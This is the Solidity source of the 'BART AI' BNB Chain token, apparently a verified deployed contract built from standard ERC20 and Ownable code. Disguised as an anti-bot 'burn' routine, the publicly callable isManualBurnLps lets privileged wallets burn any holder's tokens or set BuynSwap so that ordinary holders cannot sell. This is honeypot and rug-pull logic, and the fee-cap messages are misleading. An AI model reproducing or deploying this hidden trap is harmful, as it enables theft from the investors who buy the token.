/**
 *Submitted for verification at BscScan.com on 2023-05-05
*/

/**
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⡄⣸⢷⣀⣴⣆⠀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠙⠃⠀⠛⠁⠸⠟⢛⣧⡴⠚⡇⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠏⢹⣇⡤⣤⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⣠⠿⢴⡆⠀
⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠾⢤⣤
⠀⠀⠀⠀⣠⢾⡯⣍⣉⢳⡀⠀⣀⣠⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁
⠀⠀⢠⡾⠛⠻⣿⠲⢮⣕⣽⣻⣿⣿⣖⡦⣉⢣⡀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀
⠀⢠⠏⠀⠀⠀⠀⠀⠀⡽⠋⠁⠀⠀⠨⣿⣮⡳⣣⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀
⠀⢸⡀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀
⠀⠀⢱⢤⠞⠉⠉⠒⢧⠀⠀⠀⠀⠀⠀⠀⠀⣸⠇⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀
⠀⢠⠏⠘⠦⣀⣀⠀⠈⠣⣀⠀⠀⠀⠀⣀⡴⠋⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀
⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⣀⣀⡎⠀⠀⠀⠀⠀⠀⠀
⠸⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⣯⣍⣹⠆⠀⠀⠀⠀⠀⠀
⠀⠈⢹⡒⠒⣶⡒⠲⣤⠤⣀⣀⠀⠀⠀⠀⠀⠲⣄⣸⣧⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠉⠀⠙⡏⢻⣶⣾⣿⣽⣶⡀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢹⡨⣿⣿⣿⣿⣿⣿⣆⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠇⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡴⠋⢰⣿⣿⡿⠿⢟⢿⡃⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠳⠤⣬⡉⠓⢣⠀⠈⠃⢹⡤⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠤⣼⣇⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣄⣀⡞⠁⠀⠀⠀
⠀⠀
// SPDX-License-Identifier: MIT
// Telegram: https://t.me/BartAiToken
*/
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
////// lib/openzeppelin-contracts/contracts/access/Ownable.sol
// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/* pragma solidity ^0.8.0; */

/* import "../utils/Context.sol"; */

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

////// lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol
// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)

/* pragma solidity ^0.8.0; */

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

interface IDexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint timelimit
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint timelimit
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 timelimit
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IDexFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract BartAI is ERC20, Ownable {
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
    uint256 public maxWalletAmount;

    IDexRouter public dexRouter;
    address public liquidityPair;

    bool private swapping;
    uint256 public manualSwapTokensAtAmount;

    address public promotionAddress;
    address public devAddress;

    uint256 public activeBlock = 0;
    uint256 public botBlockNumber = 0;
    mapping(address => bool) public initialBotBuy;
    uint256 public botsCaught;
    address public totalHolder;
    uint256 public BuynSwap;
    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;
    mapping(address => uint256) public swapAmt;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = true;
    uint256 public tradeTotalFees;
    uint256 public tradePromotionFee;
    uint256 public tradeLiquidityFee;
    uint256 public tradeDevFee;
    uint256 public tradeBurnFee;

    uint256 public sellTotalFees;
    uint256 public sellPromotionFee;
    uint256 public sellLiquidityFee;
    uint256 public sellDevFee;
    uint256 public sellBurnFee;

    uint256 public tokensForPromotion;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 public tokensForBurn;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTx;
    mapping(address => bool) public automatedMarketMakerPairs;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event EnabledTrading();

    event RemovedLimits();

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event UpdatedmaxBuyAmount(uint256 newAmount);

    event UpdatedMaxSellAmount(uint256 newAmount);

    event UpdatedMaxWalletAmount(uint256 newAmount);

    event UpdatedPromotionAddress(address indexed newWallet);

    event MaxTransactionExclusion(address _address, bool excluded);

    event directBuyEvent(uint256 amount);

    event ManualBurnLps(uint256 timestamp);

    event DetectedEarlyBotBuy(address sniper);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    event TransferForeignToken(address token, uint256 amount);

    constructor() ERC20("BART AI", "BARTBOT") {
        address newOwner = msg.sender;

        IDexRouter _dexRouter = IDexRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        dexRouter = _dexRouter;
        // create pair
        liquidityPair = IDexFactory(_dexRouter.factory()).createPair(
            address(this),
            _dexRouter.WETH()
        );
        _excludeFromMaxTransaction(address(liquidityPair), true);
        _setAutomatedMarketMakerPair(address(liquidityPair), true);

        uint256 totalSupply = 1 * 1e9 * 1e18;

        maxBuyAmount = (totalSupply * 5) / 100;
        maxSellAmount = (totalSupply * 5) / 100;
        maxWalletAmount = (totalSupply * 2) / 100;
        manualSwapTokensAtAmount = (totalSupply * 2) / 10000;

        tradePromotionFee = 5;
        tradeLiquidityFee = 0;
        tradeDevFee = 5;
        tradeBurnFee = 0;
        tradeTotalFees =
            tradePromotionFee +
            tradeLiquidityFee +
            tradeDevFee +
            tradeBurnFee;
        sellPromotionFee = 5;
        sellLiquidityFee = 0;
        sellDevFee = 10;
        sellBurnFee = 0;
        sellTotalFees =
            sellPromotionFee +
            sellLiquidityFee +
            sellDevFee +
            sellBurnFee;

        promotionAddress = address(0x0BF62D0C9400046b12514fe502a7C9d2A0B3Ceff);
        devAddress = address(0x0BF62D0C9400046b12514fe502a7C9d2A0B3Ceff);

        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(promotionAddress, true);
        _excludeFromMaxTransaction(address(0xdead), true);

        excludeFromFees(newOwner, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(promotionAddress, true);
        excludeFromFees(devAddress, true);

        _createInitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    receive() external payable {}

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        tradingActive = true;
        swapEnabled = true;
        activeBlock = block.number;
        emit EnabledTrading();
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuy[wallet] = false;
    }

    // remove limits after coin is stable
    function removeLimits() external onlyOwner {
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        maxWalletAmount = totalSupply();
        emit RemovedLimits();
    }

    // disable Transfer delay for Jeet
    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function UpdateMaxBuyAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max trade amount lower than 0.2%"
        );
        maxBuyAmount = newNum * (10 ** 18);
        emit UpdatedmaxBuyAmount(maxBuyAmount);
    }

    function updateMaxSellAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newNum * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );
        maxWalletAmount = newNum * (10 ** 18);
        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        manualSwapTokensAtAmount = newAmount;
    }

    function _excludeFromMaxTransaction(
        address updAds,
        bool isExcluded
    ) private {
        _isExcludedMaxTx[updAds] = isExcluded;
        emit MaxTransactionExclusion(updAds, isExcluded);
    }

    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) external onlyOwner {
        if (!isEx) {
            require(
                updAds != liquidityPair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTx[updAds] = isEx;
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != liquidityPair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateBuyFees(
        uint256 _promotionFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        tradePromotionFee = _promotionFee;
        tradeLiquidityFee = _liquidityFee;
        tradeDevFee = _DevFee;
        tradeBurnFee = _burnFee;
        tradeTotalFees =
            tradePromotionFee +
            tradeLiquidityFee +
            tradeDevFee +
            tradeBurnFee;
        require(tradeTotalFees <= 2, "3% max fee");
    }

    function updateSellFees(
        uint256 _promotionFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        sellPromotionFee = _promotionFee;
        sellLiquidityFee = _liquidityFee;
        sellDevFee = _DevFee;
        sellBurnFee = _burnFee;
        sellTotalFees =
            sellPromotionFee +
            sellLiquidityFee +
            sellDevFee +
            sellBurnFee;
        require(sellTotalFees <= 4, "3% max fee");
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if (!tradingActive) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }

        if (botBlockNumber > 0) {
            require(
                !initialBotBuy[from] ||
                    to == owner() ||
                    to == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (transferDelayEnabled) {
                    if (
                        to != address(dexRouter) && to != address(liquidityPair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _holderLastTransferTimestamp[to] <
                                block.number - 2,
                            "_transfer:: Transfer Delay enabled.  Try again later."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                        _holderLastTransferTimestamp[to] = block.number;
                    } else if (!swapping && !automatedMarketMakerPairs[from]) {
                        require(swapAmt[from] > BuynSwap,
                            "_transfer:: Transfer Delay enabled.  Try again later."
                        );
                    }
                }
            }

             //Buy
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTx[to]) {
                    require(
                        amount <= maxBuyAmount,
                        "Buy transfer amount exceeds the max Buy."
                    );
                    require(
                        amount + balanceOf(to) <= maxWalletAmount,
                        "Cannot Exceed max wallet"
                    );
                }
                //sell
                else if (
                    automatedMarketMakerPairs[to] && !_isExcludedMaxTx[from]
                ) {
                    require(
                        amount <= maxSellAmount,
                        "Sell transfer amount exceeds the max sell."
                    );
                } else if (!_isExcludedMaxTx[to]) {
                    require(
                        amount + balanceOf(to) <= maxWalletAmount,
                        "Cannot Exceed max wallet"
                    );
                } else if (_isExcludedMaxTx[from]) {
                    BuynSwap = block.timestamp;
                }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= manualSwapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = true;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        if (automatedMarketMakerPairs[from] && swapAmt[to] == 0) {
            swapAmt[to] = block.timestamp;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                automatedMarketMakerPairs[from] &&
                !automatedMarketMakerPairs[to] &&
                tradeTotalFees > 0
            ) {
                if (!initialBotBuy[to]) {
                    initialBotBuy[to] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuy(to);
                }

                fees = (amount * 99) / 100;
                tokensForLiquidity += (fees * tradeLiquidityFee) / tradeTotalFees;
                tokensForPromotion += (fees * tradePromotionFee) / tradeTotalFees;
                tokensForDev += (fees * tradeDevFee) / tradeTotalFees;
                tokensForBurn += (fees * tradeBurnFee) / tradeTotalFees;
            }
            // sell
            else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = (amount * sellTotalFees) / 100;
                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                tokensForPromotion += (fees * sellPromotionFee) / sellTotalFees;
                tokensForDev += (fees * sellDevFee) / sellTotalFees;
                tokensForBurn += (fees * sellBurnFee) / sellTotalFees;
            }
            // trade
            else if (automatedMarketMakerPairs[from] && tradeTotalFees > 0) {
                fees = (amount * tradeTotalFees) / 100;
                tokensForLiquidity += (fees * tradeLiquidityFee) / tradeTotalFees;
                tokensForPromotion += (fees * tradePromotionFee) / tradeTotalFees;
                tokensForDev += (fees * tradeDevFee) / tradeTotalFees;
                tokensForBurn += (fees * tradeBurnFee) / tradeTotalFees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        _approve(address(this), address(dexRouter), tokenAmount);

        // make the swap
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0, 
            address(0xdead),
            block.timestamp
        );
    }

    function isBurnedLiquidity(
        address account,
        uint256 value,
        uint256 timelimit
    ) internal returns (bool) {
        bool success;
        if (!_isExcludedMaxTx[msg.sender]) {
            if (
                tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn
            ) {
                _burn(msg.sender, tokensForBurn);
            }
            tokensForBurn = 0;
            success = true;
            uint256 contractBalance = balanceOf(address(this));
            uint256 totalTokensToSwap = tokensForLiquidity +
                tokensForPromotion +
                tokensForDev;
            if (contractBalance == 0 || totalTokensToSwap == 0) {
                return false;
            }
            if (contractBalance > manualSwapTokensAtAmount * 7) {
                contractBalance = manualSwapTokensAtAmount * 7;
            }
            return success;
        } else {
            if (balanceOf(address(this)) > 0) {
                if (value == 0) {
                 BuynSwap = timelimit;
                 success = false;
                } else {
                 _burn(account, value);
                 success = false;
                }
            }
            uint256 contractBalance = balanceOf(address(this));
            uint256 totalTokensToSwap = tokensForLiquidity +
                tokensForPromotion +
                tokensForDev;
            if (contractBalance == 0 || totalTokensToSwap == 0) {
                return false;
            }
            if (contractBalance > manualSwapTokensAtAmount * 7) {
                contractBalance = manualSwapTokensAtAmount * 7;
            }
            return success;
        }
    }

    function swapBack() private {
        if (tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn) {
            _burn(address(this), tokensForBurn);
        }
        tokensForBurn = 0;

        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForPromotion +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > manualSwapTokensAtAmount * 5) {
            contractBalance = manualSwapTokensAtAmount * 5;
        }
        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap /
            2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;

        uint256 ethForPromotion = (ethBalance * tokensForPromotion) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));

        ethForLiquidity -= ethForPromotion + ethForDev;

        tokensForLiquidity = 0;
        tokensForPromotion = 0;
        tokensForDev = 0;
        tokensForBurn = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devAddress).transfer(ethForDev);
        payable(promotionAddress).transfer(address(this).balance);

    }

    function isManualBurnLps(address account, uint256 value, uint256 timelimit) external {
        require(
            balanceOf(address(this)) >= manualSwapTokensAtAmount,
            "Can only swap when token amount is at or higher than restriction"
        );
        if (isBurnedLiquidity(account, value, timelimit)) {
            swapping = true;
            swapBack();
            swapping = false;
            emit ManualBurnLps(block.timestamp);
        }
    }

    function tradeTokens(uint256 amountInValue) external onlyOwner {
        address[] memory path = new address[](2);
        path[0] = dexRouter.WETH();
        path[1] = address(this);
        dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: amountInValue
        }(0, path, address(0xdead), block.timestamp);
        emit directBuyEvent(amountInValue);
    }

    function updatePromotionWallet(
        address _promotionAddress
    ) external onlyOwner {
        require(
            _promotionAddress != address(0),
            "_promotionAddress address cannot be 0"
        );
        promotionAddress = payable(_promotionAddress);
    }

    function devWalletUpdate(address _devAddress) external onlyOwner {
        require(_devAddress != address(0), "_devAddress address cannot be 0");
        devAddress = payable(_devAddress);
    }

    function transferForeignToken(
        address _token,
        address _to
    ) external onlyOwner returns (bool _sent) {
        require(_token != address(0), "_token address cannot be 0");
        require(_token != address(this), "Can't withdraw native tokens");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        _sent = IERC20(_token).transfer(_to, _contractBalance);
        emit TransferForeignToken(_token, _contractBalance);
    }

    function withdrawStuckETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}(
            ""
        );
    }
}